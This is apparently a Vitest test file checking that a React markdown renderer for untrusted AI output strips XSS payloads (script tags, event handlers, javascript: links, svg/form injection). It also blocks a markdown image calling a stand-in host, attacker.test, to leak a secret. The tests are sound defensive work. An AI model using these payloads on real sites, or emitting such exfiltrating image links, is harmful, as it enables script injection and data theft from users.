import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "@/components/chat/safe-markdown";

const render = (md: string) => renderToStaticMarkup(createElement(SafeMarkdown, null, md));

describe("safe markdown rendering of untrusted AI output", () => {
  it("renders ordinary markdown and code", () => {
    const html = render("# Title\n\n**bold** and `code`\n\n```js\nconst a = 1;\n```\n\n- one\n- two");
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("const a = 1;");
    expect(html).toContain("<li");
  });

  it("never emits script tags or inline event handlers from raw HTML", () => {
    const html = render('Hi <script>alert(1)</script> <img src=x onerror=alert(1)> <a href="x" onclick="evil()">l</a> <iframe src="https://evil.test"></iframe>');
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/onerror|onclick/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<img/i);
  });

  it("blocks javascript:, data: and vbscript: links; allows http(s)/mailto with safe rel", () => {
    const bad = render("[a](javascript:alert(1)) [b](data:text/html;base64,PHNjcmlwdD4=) [c](vbscript:x) [d](JaVaScRiPt:alert(1))");
    expect(bad).not.toMatch(/javascript:|data:text|vbscript:/i);
    const good = render("[site](https://example.com/a?b=1) [mail](mailto:a@b.co)");
    expect(good).toContain('href="https://example.com/a?b=1"');
    expect(good).toContain("noopener noreferrer nofollow");
    expect(good).toContain('target="_blank"');
    expect(good).toContain("mailto:a@b.co");
  });

  it("does not render images (remote image URLs are an exfiltration channel)", () => {
    const html = render("![secret](https://attacker.test/log?data=SECRET) and ![x](data:image/png;base64,AAAA)");
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toContain("attacker.test/log");
  });

  it("escapes HTML inside code blocks and tables are sanitised", () => {
    const html = render("```\n<script>alert(1)</script>\n```\n\n| a | b |\n|---|---|\n| <b>x</b> | 2 |");
    expect(html).toContain("&lt;script&gt;");
    expect(html).not.toMatch(/<script/i);
    expect(html).toContain("<table");
  });

  it("neutralises style/form/svg injection", () => {
    const html = render('<style>body{display:none}</style><form action="https://evil.test"><input name=x></form><svg onload=alert(1)></svg><details open ontoggle=alert(1)>x</details>');
    expect(html).not.toMatch(/<style|<form|<input|<svg|ontoggle|onload/i);
  });
});
